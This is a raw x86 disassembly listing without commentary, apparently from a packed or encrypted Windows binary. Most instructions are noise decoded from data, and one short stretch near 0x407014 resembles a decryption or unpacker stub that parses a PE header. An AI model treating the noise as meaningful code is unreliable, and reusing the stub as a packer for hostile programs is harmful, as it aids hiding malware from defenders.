  406f0c:	mov    BYTE PTR [ecx+ebp*4-0x18753a37],cl
  406f13:	add    BYTE PTR [ebp+ecx*8+0x72dd94a],bh
  406f1a:	adc    ebp,ecx
  406f1c:	mov    esp,0x27c3d077
  406f21:	pop    eax
  406f22:	pop    edi
  406f23:	out    0x68,al
  406f25:	mov    edi,0x6abbe945
  406f2a:	sti    
  406f2b:	fisub  DWORD PTR [ecx+0x1e51594e]
  406f31:	sbb    BYTE PTR [ebx],cl
  406f33:	push   ecx
  406f34:	in     al,0x58
  406f36:	pusha  
  406f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f38:	es jns 0x406ee9
  406f3b:	mov    ds:0xac25d007,eax
  406f40:	rcr    BYTE PTR [edi-0x24],1
  406f43:	pop    esi
  406f44:	mov    fs,WORD PTR [ebx]
  406f46:	fisubr DWORD PTR [ecx+0x75081bd3]
  406f4c:	xor    eax,0xd5646c6
  406f51:	fdivr  st(2),st
  406f53:	call   0x1b76:0xc99822a4
  406f5a:	xchg   BYTE PTR [ebx],bh
  406f5c:	mov    ebp,0x9b6714d2
  406f61:	movmskps ebx,xmm3
  406f64:	pop    es
  406f65:	mov    ebp,esp
  406f67:	retf   
  406f68:	rol    BYTE PTR [esi+0x6],0x71
  406f6c:	or     BYTE PTR [eax+0x70],dl
  406f6f:	add    esp,DWORD PTR [edi+0x7ff9c8e2]
  406f75:	and    DWORD PTR [ebx+0x2a],ebx
  406f78:	mov    dl,0x90
  406f7a:	mov    dh,0x36
  406f7c:	aas    
  406f7d:	dec    edi
  406f7e:	mov    al,0xfa
  406f80:	sbb    ch,bh
  406f82:	stos   DWORD PTR es:[edi],eax
  406f83:	xchg   esi,eax
  406f84:	lock push 0xffffffb0
  406f87:	(bad)  
  406f88:	pushf  
  406f89:	jbe    0x406fb2
  406f8b:	fnsave [edi]
  406f8d:	and    esi,eax
  406f8f:	mov    esi,DWORD PTR [edi-0x58]
  406f92:	pusha  
  406f93:	inc    edi
  406f94:	jb     0x406fec
  406f96:	add    bl,dh
  406f98:	mov    cl,0x9d
  406f9a:	(bad)  
  406f9b:	retf   
  406f9c:	push   0xffffffc0
  406f9e:	sahf   
  406f9f:	jmp    0xc7e1:0x738c3c93
  406fa6:	fldz   
  406fa8:	xchg   DWORD PTR [edi+0x78eb6980],ecx
  406fae:	mov    ch,0x3a
  406fb0:	mov    dl,0xd2
  406fb2:	scas   al,BYTE PTR es:[edi]
  406fb3:	or     ch,ah
  406fb5:	adc    ebx,edx
  406fb7:	cmc    
  406fb8:	add    DWORD PTR [ecx+0x3639dc69],ecx
  406fbe:	cmp    edi,esp
  406fc0:	add    ecx,ecx
  406fc2:	test   eax,0x3dc45165
  406fc7:	and    eax,0x7f5138b1
  406fcc:	ret    0x2a18
  406fcf:	aam    0xb0
  406fd1:	ds dec ecx
  406fd3:	repz push esp
  406fd5:	cmc    
  406fd6:	mov    ch,0x8c
  406fd8:	jo     0x406fc2
  406fda:	push   0xffffffa0
  406fdc:	pop    ecx
  406fdd:	mov    ebx,0x589674b8
  406fe2:	pop    edi
  406fe3:	or     eax,0x4627bc64
  406fe8:	push   edi
  406fe9:	fimul  WORD PTR [esi]
  406feb:	xor    bh,dh
  406fed:	mov    ds:0xa5d10cc2,al
  406ff2:	mov    ah,0x53
  406ff4:	jecxz  0x406ffc
  406ff6:	sahf   
  406ff7:	out    dx,eax
  406ff8:	mov    DWORD PTR [ebx+0x1eef6d1c],edx
  406ffe:	ss mov ss,esp
  407001:	xor    BYTE PTR [ebp-0x2a1606b0],dl
  407007:	popa   
  407008:	out    0x24,eax
  40700a:	inc    esp
  40700b:	inc    ebp
  40700c:	les    ebx,FWORD PTR [ebx+0x5f]
  40700f:	pop    esi
  407010:	leave  
  407011:	ret    0xc
  407014:	push   ebp
  407015:	mov    ebp,esp
  407017:	push   ecx
  407018:	or     eax,eax
  40701a:	mov    DWORD PTR [ebp-0x4],0xf89c8581
  407021:	mov    eax,DWORD PTR [ebp+0x8]
  407024:	not    ecx
  407026:	movsx  eax,BYTE PTR [eax]
  407029:	and    DWORD PTR ds:0x42e000,0x0
  407033:	mov    edx,DWORD PTR ds:0x42e000
  407039:	inc    edx
  40703a:	mov    DWORD PTR ds:0x42e000,edx
  407040:	cmp    DWORD PTR ds:0x42e000,0x21
  407047:	jl     0x407065
  40704d:	jmp    0x407058
  407052:	call   DWORD PTR ds:0x434913
  407058:	cmp    DWORD PTR ds:0x42e000,0x11
  40705f:	jb     0x407033
  407065:	mov    edx,0x3272e4
  40706a:	sbb    ecx,0x6b74
  407070:	sub    eax,edx
  407072:	mov    ecx,0x751089d
  407077:	xor    eax,ecx
  407079:	mov    DWORD PTR ds:0x42e014,0x2a99
  407083:	cmp    eax,0xf89c85f4
  407088:	mov    DWORD PTR ds:0x42e028,0x5d7f
  407092:	jne    0x40944c
  407098:	xor    DWORD PTR ds:0x42e014,edx
  40709e:	mov    eax,DWORD PTR [ebp+0x8]
  4070a1:	or     DWORD PTR ds:0x432004,0x42f01c
  4070ab:	push   esi
  4070ac:	mov    esi,DWORD PTR [ebp+0x8]
  4070af:	add    esi,DWORD PTR [eax+0x3c]
  4070b2:	mov    DWORD PTR [ebp+0x8],esi
  4070b5:	mov    eax,DWORD PTR [ebp-0x4]
  4070b8:	mov    esi,DWORD PTR [ebp+0x8]
  4070bb:	xor    eax,ecx
  4070bd:	add    eax,edx
  4070bf:	jmp    0x40943a
  4070c4:	mov    edi,0x8bdf5962
  4070c9:	retf   
  4070ca:	mov    ebx,0x614b0602
  4070cf:	mov    ebp,0x4761426a
  4070d4:	test   al,0x38
  4070d6:	jb     0x40714a
  4070d8:	adc    BYTE PTR [edi+0x72],bl
  4070db:	jb     0x4070fa
  4070dd:	dec    esi
  4070de:	cmc    
  4070df:	loop   0x407084
  4070e1:	enter  0xf138,0xb1
  4070e5:	lods   eax,DWORD PTR ds:[esi]
  4070e6:	stos   BYTE PTR es:[edi],al
  4070e7:	lods   al,BYTE PTR ds:[esi]
  4070e8:	retf   0xe459
  4070eb:	stos   BYTE PTR es:[edi],al
  4070ec:	sahf   
  4070ed:	inc    esi
  4070ee:	xor    esp,DWORD PTR [eax+0x11bcf58d]
  4070f4:	xor    esi,DWORD PTR [edi]
  4070f6:	adc    ecx,DWORD PTR [ebx]
  4070f8:	pop    ebx
  4070f9:	lock (bad) 
  4070fb:	or     al,0x55
  4070fd:	fimul  DWORD PTR [eax-0x6e7179e]
  407103:	pop    edi
  407104:	pop    es
  407105:	je     0x407134
  407107:	fdiv   QWORD PTR [esi+esi*8-0x52]
  40710b:	pop    edx
  40710c:	xor    dl,BYTE PTR [esi-0x5965a5ca]
  407112:	sub    al,0xb2
  407114:	sbb    BYTE PTR [ecx],bl
  407116:	adc    bh,BYTE PTR [esi]
  407118:	out    0x3b,al
  40711a:	or     DWORD PTR [eax],0x33d61cf6
  407120:	mov    esp,DWORD PTR [esi]
  407122:	sbb    esi,ebx
  407124:	in     eax,0x5f
  407126:	mov    WORD PTR [edx+0x4f],es
  407129:	mov    DWORD PTR [edi],edx
  40712b:	jmp    0x407172
  40712d:	fbstp  TBYTE PTR [esi-0x6f]
  407130:	jecxz  0x4070e7
  407132:	push   esi
  407133:	xor    eax,0x9c0b526b
  407138:	into   
  407139:	adc    al,0xd0
  40713b:	call   0xe1ab:0x5ad29cf0
  407142:	loope  0x4070dc
  407144:	rol    edi,0xee
  407147:	ss cmc 
  407149:	xor    al,cl
  40714b:	jl     0x407164
  40714d:	jno    0x407133
  40714f:	xor    BYTE PTR [edx],0x20
  407152:	iret   
  407153:	(bad)  
  407154:	or     bh,BYTE PTR [eax-0x369375e2]
  40715a:	xor    DWORD PTR [edi],ecx
  40715c:	pop    ebp
  40715d:	adc    ah,bh
  40715f:	dec    edx
  407160:	jns    0x4071a1
  407162:	jg     0x40714c
  407164:	mov    al,0x17
  407166:	xchg   esi,eax
  407167:	fdiv   DWORD PTR [ebx-0x67]
  40716a:	jg     0x40716e
  40716c:	add    ebp,DWORD PTR [eax]
  40716e:	(bad)  
  40716f:	repnz aad 0x99
  407172:	das    
  407173:	(bad)  
  407175:	inc    ebp
  407176:	xchg   ecx,eax
  407177:	arpl   sp,di
  407179:	cmp    al,0x71
  40717b:	dec    edi
  40717c:	pmaddubsw mm6,QWORD PTR [eax]
  407180:	into   
  407181:	mov    ch,0xfb
  407183:	in     al,dx
  407184:	hlt    
  407185:	cmp    eax,0x3aab0fc2
  40718a:	jo     0x407131
  40718c:	inc    esi
  40718d:	jmp    0xa940:0x71ed68be
  407194:	cmp    ah,0xf1
  407197:	push   ss
  407198:	xor    DWORD PTR [si+0xf],eax
  40719c:	leave  
  40719d:	and    DWORD PTR [edi],ecx
  40719f:	jns    0x4071a8
  4071a1:	cmp    ah,dh
  4071a3:	mov    fs,esi
  4071a5:	retf   0xd856
  4071a8:	shl    BYTE PTR [ebx-0x246e1046],1
  4071ae:	xor    BYTE PTR [esi+0x45],al
  4071b1:	fisubr WORD PTR ds:0x200e59f7
  4071b7:	fnstsw WORD PTR [ebp+ebp*4-0x5b]
  4071bb:	rol    DWORD PTR [eax-0x12d7db4c],cl
  4071c1:	adc    esi,DWORD PTR [edx+0x42]
  4071c4:	loop   0x40717e
  4071c6:	sbb    al,0xdf
  4071c8:	popa   
  4071c9:	sbb    al,0x4c
  4071cb:	dec    ecx
  4071cc:	mov    BYTE PTR [ecx+0x57],bh
  4071cf:	fdivr  QWORD PTR [eax]
  4071d1:	icebp  
  4071d2:	popa   
  4071d3:	jle    0x4071fd
  4071d5:	mov    esi,?
  4071d7:	lods   al,BYTE PTR ds:[esi]
  4071d8:	into   
  4071d9:	js     0x407183
  4071db:	in     al,dx
  4071dc:	dec    ecx
  4071dd:	cmp    eax,0xbd2a3d14
  4071e2:	outs   dx,DWORD PTR ds:[esi]
  4071e3:	std    
  4071e4:	cmp    ch,ch
  4071e6:	aas    
  4071e7:	test   DWORD PTR [ebx],edi
  4071e9:	cdq    
  4071ea:	or     BYTE PTR [edi+0x68],bl
  4071ed:	xchg   ebp,eax
  4071ee:	ficomp DWORD PTR [ecx+0x12a78bbf]
  4071f4:	sub    dl,dl
  4071f6:	mov    al,BYTE PTR [ebx-0x7b702a97]
  4071fc:	(bad)  
  4071fd:	pop    ecx
  4071fe:	hlt    
  4071ff:	push   esi
  407200:	imul   esi,DWORD PTR [edi],0x6b804fea
  407206:	adc    al,0x82
  407208:	lea    edi,[ebx]
  40720a:	mov    ecx,0x8c454977
  40720f:	ja     0x40721e
  407211:	popa   
  407212:	outs   dx,DWORD PTR ds:[esi]
  407213:	das    
  407214:	outs   dx,BYTE PTR ds:[esi]
  407215:	test   DWORD PTR [ebx+ebx*1],edx
  407218:	inc    edx
  407219:	ss sti 
  40721b:	outs   dx,DWORD PTR ds:[esi]
  40721c:	inc    esp
  40721d:	mov    ch,0xe8
  40721f:	mov    bl,0x66
  407221:	cli    
  407222:	stos   BYTE PTR es:[edi],al
  407223:	pop    eax
  407224:	add    dh,BYTE PTR [edx+0x36c9099e]
  40722a:	idiv   BYTE PTR [ecx+ecx*4+0x1e]
  40722e:	add    al,0xc9
  407230:	or     DWORD PTR [edi-0x3c910a63],ebp
  407236:	arpl   WORD PTR [edi],di
  407238:	dec    eax
  407239:	dec    edi
  40723a:	pop    ebp
  40723b:	fst    DWORD PTR [ecx-0x45f748a9]
  407241:	mov    al,0x10
  407243:	push   0xffffffb5
  407245:	inc    edx
  407246:	inc    edi
  407247:	mov    ebx,DWORD PTR [ebp*8+0x427e1d26]
  40724e:	outs   dx,BYTE PTR ds:[esi]
  40724f:	pop    edi
  407250:	add    DWORD PTR [edi+0x5e],edi
  407253:	dec    edi
  407254:	jmp    0x427eff2d
  407259:	inc    ecx
  40725a:	adc    ah,BYTE PTR [esi+0x42]
  40725d:	call   0xd5c7:0x1c914696
  407264:	mov    esp,0xb47d9e04
  407269:	inc    edi
  40726a:	sub    ecx,DWORD PTR [esi+0x461800d5]
  407270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407271:	iret   
  407272:	das    
  407273:	sbb    eax,0xe606b5cf
  407278:	cmp    eax,0xb382440a
  40727d:	pushf  
  40727e:	pop    ecx
  40727f:	pop    edi
  407280:	loopne 0x40728c
  407282:	les    ebx,FWORD PTR [esi]
  407284:	ret    
  407285:	xchg   DWORD PTR [esp+esi*8-0x52],esi
  407289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40728a:	icebp  
  40728b:	add    BYTE PTR [eax-0x2545f55],0xc7
  407292:	rol    DWORD PTR [edi-0x72d94650],cl
  407298:	cmc    
  407299:	cmp    DWORD PTR [ebx+0x75],esp
  40729c:	mov    eax,ds:0x57da8fa3
  4072a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072a2:	sahf   
  4072a3:	xchg   edx,ecx
  4072a5:	push   eax
  4072a6:	int3   
  4072a7:	add    eax,0x238b0e9
  4072ac:	push   ds
  4072ad:	cmp    edx,ebx
  4072af:	dec    ebp
  4072b0:	inc    esp
  4072b1:	xor    edi,DWORD PTR [eax+0x66ed5321]
  4072b7:	and    ebx,DWORD PTR [edi+0x5a]
  4072ba:	mov    edx,eax
  4072bc:	(bad)  
  4072bd:	cdq    
  4072be:	cmp    ebp,DWORD PTR [esi]
  4072c0:	inc    edx
  4072c1:	jns    0x4072e0
  4072c3:	sub    edi,edx
  4072c5:	pop    ebx
  4072c6:	inc    esi
  4072c7:	dec    edx
  4072c8:	ins    DWORD PTR es:[edi],dx
  4072c9:	popa   
  4072ca:	adc    DWORD PTR [edx],0xffffffd4
  4072cd:	pusha  
  4072ce:	mov    ebx,0x89d9ec00
  4072d3:	pop    ds
  4072d4:	(bad)  
  4072d5:	cdq    
  4072d6:	adc    DWORD PTR [edx],esi
  4072d8:	cmp    BYTE PTR es:[eax+0x2b],ch
  4072dc:	je     0x40731c
  4072de:	out    0x82,eax
  4072e0:	(bad)
  4072e4:	mov    eax,ds:0xc09f9fd1
  4072e9:	loopne 0x40729c
  4072eb:	mov    ecx,0x1ad90126
  4072f0:	je     0x407317
  4072f2:	shl    dl,cl
  4072f4:	(bad)  
  4072f5:	fistp  WORD PTR [edx-0x6b847b]
  4072fb:	add    al,0x67
  4072fd:	in     al,dx
  4072fe:	test   al,0xf7
  407300:	pop    eax
  407301:	or     bl,BYTE PTR [edi]
  407303:	mov    gs:0xc204c7cb,eax
  407309:	stos   DWORD PTR es:[edi],eax
  40730a:	adc    DWORD PTR [eax-0x6f],esp
  40730d:	or     ebx,eax
  40730f:	pop    es
  407310:	dec    ebx
  407312:	dec    esp
  407313:	fs dec ecx
  407315:	lods   eax,DWORD PTR ds:[esi]
  407316:	ins    BYTE PTR es:[edi],dx
  407317:	cdq    
  407318:	lods   al,BYTE PTR ds:[esi]
  407319:	dec    eax
  40731a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40731b:	ins    BYTE PTR es:[edi],dx
  40731c:	mov    ch,BYTE PTR [edi+0x49]
  40731f:	jmp    0x407356
  407321:	add    eax,0x66c522b0
  407326:	iret   
  407327:	mov    BYTE PTR [ebp-0x226cd12d],0xa5
  40732e:	lods   al,BYTE PTR ds:[esi]
  40732f:	lock xor bl,cl
  407332:	shl    DWORD PTR [edx+0x3b],cl
  407335:	les    eax,FWORD PTR [eax+edi*2+0x3eed38d3]
  40733c:	mov    cl,0xc5
  40733e:	or     eax,0xed2b9a02
  407343:	sbb    dh,BYTE PTR [ebp-0x2a547321]
  407349:	(bad)  
  40734a:	xchg   edx,eax
  40734b:	adc    DWORD PTR [eax-0x78],esi
  40734e:	jecxz  0x407353
  407350:	inc    esp
  407351:	(bad)  
  407352:	retf   
  407353:	xchg   ebp,eax
  407354:	out    dx,al
  407355:	call   0xc82e:0x915dd351
  40735c:	jecxz  0x407343
  40735e:	and    edi,DWORD PTR [esi+0x524615d4]
  407364:	jle    0x407396
  407366:	sub    DWORD PTR [eax-0x20],0xfffffff4
  40736a:	adc    BYTE PTR [eax+0x736a8cd5],bh
  407370:	stc    
  407371:	mov    eax,0x3bec6547
  407376:	mov    esi,0x7e21932f
  40737b:	out    dx,al
  40737c:	inc    eax
  40737d:	push   eax
  40737e:	hlt    
  40737f:	nop
  407380:	fadd   DWORD PTR [edx]
  407382:	xchg   ebx,eax
  407383:	movaps xmm1,XMMWORD PTR [ebp+0x1f]
  407387:	out    0x31,al
  407389:	push   0xc65a375d
  40738e:	aam    0x7c
  407390:	mov    ds:0x46cbf113,eax
  407395:	pop    es
  407396:	adc    eax,0x16562e47
  40739b:	cmp    DWORD PTR [esi+ebp*2-0xc3c7c83],ebp
  4073a2:	je     0x407422
  4073a4:	mov    esi,0x86ea79cf
  4073a9:	xor    DWORD PTR [ecx+0x122d0bcf],ecx
  4073af:	ror    DWORD PTR [ecx],0x9a
  4073b2:	add    ecx,ebp
  4073b4:	cdq    
  4073b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073b7:	outs   dx,BYTE PTR ds:[si]
  4073b9:	mov    dl,0xaf
  4073bb:	(bad)  
  4073bc:	call   0x858e7d95
  4073c1:	test   eax,0x7332cf98
  4073c6:	mov    ds:0x8fecb6cb,eax
  4073cb:	push   eax
  4073cc:	pop    ds
  4073cd:	mov    dh,0x85
  4073cf:	jl     0x4073c5
  4073d1:	xchg   esi,eax
  4073d2:	or     BYTE PTR [eax-0x39],0xe0
  4073d6:	jb     0x407410
  4073d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d9:	cmp    eax,0xe292f1f
  4073de:	dec    esp
  4073df:	pop    ss
  4073e0:	test   al,0xeb
  4073e2:	dec    ecx
  4073e3:	jp     0x40743b
  4073e5:	jge    0x407440
  4073e7:	in     al,dx
  4073e8:	pushf  
  4073e9:	fwait
  4073ea:	mov    edx,0x1172e870
  4073ef:	jmp    0x407411
  4073f1:	addr16 jg 0x4073b5
  4073f4:	sahf   
  4073f5:	lahf   
  4073f6:	mov    dl,0x61
  4073f8:	cmp    eax,0x2739fcad
  4073fd:	je     0x407384
  4073ff:	cld    
  407400:	test   BYTE PTR [eax-0x60],0xed
  407404:	push   ebx
  407405:	cmp    eax,0x95c3855f
  40740a:	push   cs
  40740b:	ss call 0xaab:0x9ff4fc57
  407413:	sbb    esp,DWORD PTR [edi]
  407415:	rcl    dl,cl
  407417:	mov    cl,bl
  407419:	cmp    eax,0x692da48b
  40741e:	pop    edi
  40741f:	popf   
  407420:	mov    ecx,0x718feb29
  407425:	loope  0x40744f
  407427:	sahf   
  407428:	dec    esi
  407429:	sar    bl,cl
  40742b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40742c:	or     eax,0x31408df1
  407431:	imul   esp,DWORD PTR [ecx+0x165ef81f],0x3335bab8
  40743b:	mov    ss,WORD PTR [ebp-0x75787cba]
  407441:	loop   0x4073e7
  407443:	inc    esp
  407444:	stos   BYTE PTR es:[edi],al
  407445:	loop   0x4074b5
  407447:	jmp    0xc729:0xaab7aca
  40744e:	mov    al,bh
  407450:	add    cl,BYTE PTR ds:0xfab33e
  407456:	pop    ds
  407457:	paddusw mm7,QWORD PTR [ebx]
  40745a:	cmp    al,0x26
  40745c:	std    
  40745d:	frstor [ebx]
  40745f:	repz xchg edx,eax
  407461:	mov    edi,0x28d2497f
  407466:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407468:	repz xor BYTE PTR [ecx+0x7d],0xdb
  40746d:	pop    eax
  40746e:	fwait
  40746f:	test   DWORD PTR [ecx-0x26de3edf],edx
  407475:	iret   
  407476:	dec    eax
  407477:	xchg   ecx,eax
  407478:	sub    BYTE PTR [esi-0x7dcd416e],ch
  40747e:	call   0xffadd5b2
  407483:	shl    DWORD PTR [esi+0x28],cl
  407486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407487:	add    DWORD PTR [esp+ebx*4+0x1b2c23e0],esi
  40748e:	mov    ebp,es
  407490:	adc    eax,0xd4512017
  407495:	and    DWORD PTR [esi+0x4a4277f7],esi
  40749b:	jbe    0x407424
  40749d:	pushf  
  40749e:	aad    0x61
  4074a0:	lock mov es,WORD PTR [edx+0x268adf95]
  4074a7:	aaa    
  4074a8:	jl     0x4074f3
  4074aa:	lea    ebx,[eax+ecx*1+0x24bbd340]
  4074b1:	icebp  
  4074b2:	bound  esi,QWORD PTR [esi-0x2b]
  4074b5:	fcomp  QWORD PTR [edx-0x6e1cba1a]
  4074bb:	in     eax,dx
  4074bc:	mov    ds:0x1970dde9,al
  4074c2:	in     eax,0xb0
  4074c4:	(bad)  
  4074c5:	sti    
  4074c6:	jmp    0x4074ac
  4074c8:	leave  
  4074c9:	sbb    al,0xe4
  4074cb:	shr    edi,1
  4074cd:	adc    ebx,ebp
  4074cf:	int    0x2d
  4074d1:	into   
  4074d2:	(bad)  
  4074d3:	pop    ecx
  4074d4:	mov    ch,0xe4
  4074d6:	or     al,0x82
  4074d8:	add    al,ah
  4074da:	dec    esi
  4074db:	shl    BYTE PTR [edx],cl
  4074dd:	push   esi
  4074de:	xchg   ecx,eax
  4074df:	cmp    eax,0xf9628232
  4074e4:	clc    
  4074e5:	fwait
  4074e6:	std    
  4074e7:	push   esi
  4074e8:	mov    dl,0x26
  4074ea:	inc    esi
  4074eb:	ds pop bp
  4074ee:	int    0x59
  4074f0:	cmp    dl,cl
  4074f2:	sar    bh,0x1c
  4074f5:	inc    BYTE PTR [esi+0x3a8753b0]
  4074fb:	loope  0x407534
  4074fd:	push   ebp
  4074fe:	(bad)  
  4074ff:	in     al,dx
  407500:	mov    esp,0xe53a479d
  407505:	pop    esi
  407506:	mov    al,ds:0x8af28ec7
  40750b:	js     0x4074dd
  40750d:	mov    WORD PTR [eax-0x51ca88a8],gs
  407513:	imul   ecx,DWORD PTR [ecx],0xffffffff
  407516:	jmp    0xc8b6:0x5dba53a2
  40751d:	xchg   ecx,eax
  40751e:	lea    ecx,[edx-0x2db37e79]
  407524:	jg     0x4074d3
  407526:	push   esp
  407527:	or     bh,BYTE PTR [ecx-0x2e]
  40752a:	dec    BYTE PTR [edx]
  40752c:	and    al,0x0
  40752e:	iret   
  40752f:	mov    dh,0x43
  407531:	out    dx,al
  407532:	repz fcom QWORD PTR [esp+esi*4-0x52]
  407537:	xchg   edx,eax
  407538:	sbb    dh,BYTE PTR [ecx-0x38]
  40753b:	cmp    DWORD PTR [ecx+0x4a413494],ecx
  407541:	and    BYTE PTR [ebx-0x5389719],ch
  407547:	test   al,0x4d
  407549:	pop    ecx
  40754a:	sbb    ebp,ebp
  40754c:	ss adc bh,dl
  40754f:	fs int3 
  407551:	xor    DWORD PTR [edx-0x45],edi
  407554:	pop    ds
  407555:	aaa    
  407556:	xchg   ebx,eax
  407557:	push   esp
  407558:	ins    DWORD PTR es:[edi],dx
  407559:	cmp    al,0x5f
  40755b:	mov    ch,0xe1
  40755d:	xchg   esp,eax
  40755e:	cmp    DWORD PTR [edi+esi*4],ebx
  407561:	mov    esi,edx
  407563:	push   edx
  407564:	loopne 0x4075e4
  407566:	ds dec ebx
  407568:	cmp    al,0x3
  40756a:	inc    ecx
  40756b:	push   ebp
  40756c:	sbb    cl,dl
  40756e:	mov    ah,0x96
  407570:	adc    al,0x7e
  407572:	pop    esp
  407573:	shl    DWORD PTR [ebx-0x5f700ada],1
  407579:	and    ebx,DWORD PTR [edx+ebx*2]
  40757c:	mov    ch,0x35
  40757e:	ret    
  40757f:	nop
  407580:	jnp    0x407513
  407582:	adc    BYTE PTR [ebx],cl
  407584:	push   0xffffffb6
  407586:	mov    ecx,edi
  407588:	(bad)  
  407589:	xchg   ebx,eax
  40758a:	fwait
  40758b:	jns    0x407529
  40758d:	lock add eax,0xffffffed
  407591:	dec    edx
  407592:	call   0xad4e0416
  407597:	mov    cl,0x0
  407599:	sub    DWORD PTR [eax+0x46fa52f4],eax
  40759f:	mov    eax,ds:0x4b7a093
  4075a4:	fcmovu st,st(6)
  4075a6:	jmp    0xeb9e772b
  4075ab:	jmp    0xb17f:0xc8006c40
  4075b2:	or     eax,0x91ac43e2
  4075b7:	imul   ebx,DWORD PTR es:[ecx+ebp*2+0x297844d9],0x4392d5c3
  4075c3:	lods   al,BYTE PTR ds:[esi]
  4075c4:	or     ecx,ecx
  4075c6:	mov    bh,0x63
  4075c8:	mov    al,0x8e
  4075ca:	je     0x4075d2
  4075cc:	sub    eax,0xd68998ed
  4075d1:	enter  0x681c,0xa2
  4075d5:	gs inc ebx
  4075d7:	xchg   BYTE PTR [esi-0x6e],bh
  4075da:	jecxz  0x407579
  4075dc:	or     al,0x89
  4075de:	add    al,0x8d
  4075e0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075e2:	push   esp
  4075e3:	arpl   WORD PTR [edx-0x3b],dx
  4075e6:	mov    ?,WORD PTR [ebx]
  4075e8:	retf   
  4075e9:	not    BYTE PTR [esi-0xb60fb71]
  4075ef:	js     0x4075aa
  4075f1:	std    
  4075f2:	push   ds
  4075f3:	mov    ds:0x9e5095cf,eax
  4075f8:	mov    eax,ds:0xd5189aa5
  4075fd:	xchg   edi,eax
  4075fe:	hlt    
  4075ff:	inc    ecx
  407600:	sti    
  407601:	add    esi,DWORD PTR [ecx+0x67]
  407604:	pop    es
  407605:	and    al,0x70
  407607:	mov    ebx,0xcb37a63
  40760c:	lea    ecx,[edi+0x2186ab3a]
  407612:	jae    0x4075c6
  407614:	adc    eax,0xfdadcf29
  407619:	push   edx
  40761a:	xor    ebp,DWORD PTR [ecx+esi*2+0x51]
  40761e:	cmp    ebp,DWORD PTR [edi+0x34ffa92c]
  407624:	ss pop ebp
  407626:	push   esp
  407627:	in     eax,dx
  407628:	inc    eax
  407629:	fadd   QWORD PTR [ecx]
  40762b:	or     bl,BYTE PTR [ebp-0x7259b0f]
  407631:	fs jmp 0x4075bc
  407634:	ret    
  407635:	stos   BYTE PTR es:[edi],al
  407636:	repz aaa 
  407638:	xchg   edx,eax
  407639:	mov    edi,0xac1445d6
  40763e:	cmp    eax,0xa1aa1c24
  407643:	dec    ecx
  407644:	mov    edx,edx
  407646:	nop
  407647:	sub    ebx,edi
  407649:	and    DWORD PTR [edi-0x50],0xffffffc4
  40764d:	rcl    DWORD PTR [eax+0x1e094453],1
  407653:	cli    
  407654:	pop    edx
  407655:	(bad)  [ebp-0x2]
  407658:	cmp    esi,ecx
  40765a:	pop    eax
  40765b:	fild   WORD PTR [edi-0x1d]
  40765e:	int    0xe3
  407660:	fidiv  WORD PTR [edx-0x502392c9]
  407666:	push   ds
  407667:	inc    ebx
  407668:	and    BYTE PTR [esi-0x5b9fec4c],dl
  40766e:	add    BYTE PTR [esi-0x2eba51a0],ah
  407674:	push   ecx
  407675:	push   esp
  407676:	les    eax,FWORD PTR [edx-0x40ef3eeb]
  40767c:	daa    
  40767d:	mov    edi,0xff8070dd
  407682:	lock in al,0xa3
  407685:	int3   
  407686:	mov    ?,WORD PTR [ecx-0x576e75e8]
  40768c:	inc    eax
  40768d:	push   esi
  40768e:	int3   
  40768f:	shr    DWORD PTR [ebx],1
  407691:	aam    0xf2
  407693:	sbb    esi,DWORD PTR [edx]
  407695:	xchg   esp,eax
  407696:	sbb    BYTE PTR [edi],al
  407698:	enter  0x7fe2,0xec
  40769c:	aas    
  40769d:	aam    0xe
  40769f:	jmp    FWORD PTR [eax]
  4076a1:	adc    ah,BYTE PTR ds:0x5841338b
  4076a7:	push   ecx
  4076a8:	dec    eax
  4076a9:	clc    
  4076aa:	dec    ebp
  4076ab:	mov    bh,0xe4
  4076ad:	adc    DWORD PTR [edi-0x6c],ebx
  4076b0:	fst    QWORD PTR ds:0x7172f6ff
  4076b6:	jne    0x40765c
  4076b8:	cmp    ebx,esp
  4076ba:	xlat   BYTE PTR ds:[ebx]
  4076bb:	mov    bh,0x6a
  4076bd:	xor    eax,0x72fc9801
  4076c2:	pop    eax
  4076c3:	pop    ds
  4076c4:	add    al,0x7f
  4076c6:	and    BYTE PTR [esi+0x6e1e119e],cl
  4076cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076cd:	imul   eax,DWORD PTR [edi+ebp*8-0x3d],0x3c
  4076d2:	mov    eax,0xc8345ca7
  4076d7:	shr    edx,cl
  4076d9:	jmp    0xc1fdba0
  4076de:	cmp    eax,0xb3902dab
  4076e3:	sub    DWORD PTR [ebx],edi
  4076e5:	jmp    0x40774a
  4076e7:	dec    eax
  4076e8:	xchg   esp,eax
  4076e9:	in     eax,0x80
  4076eb:	push   ss
  4076ec:	sbb    esp,ebx
  4076ee:	fcmove st,st(6)
  4076f0:	push   ss
  4076f1:	xchg   DWORD PTR [edx-0x53a75fc9],edx
  4076f7:	retf   
  4076f8:	inc    edi
  4076f9:	enter  0x4f20,0x25
  4076fd:	cli    
  4076fe:	add    ebx,DWORD PTR [edx]
  407700:	mov    ebx,0xf9e2feae
  407705:	pop    ebx
  407706:	xchg   esp,eax
  407707:	fst    QWORD PTR [ecx-0x46]
  40770a:	icebp  
  40770b:	ja     0x407722
  40770d:	add    BYTE PTR [ecx+0x5e796aec],cl
  407713:	mov    dh,0x5a
  407715:	jp     0x40777f
  407717:	daa    
  407718:	xchg   ebx,eax
  407719:	repnz or al,0x4c
  40771c:	call   0x42b2:0xf5ae1917
  407723:	push   ecx
  407724:	or     BYTE PTR [esi+0xf],ah
  407727:	add    ch,BYTE PTR [esi+0x623248d6]
  40772d:	add    bl,BYTE PTR [ecx]
  40772f:	cs mov dh,0x7f
  407732:	lock sub eax,0xb6fde8e0
  407738:	dec    ebx
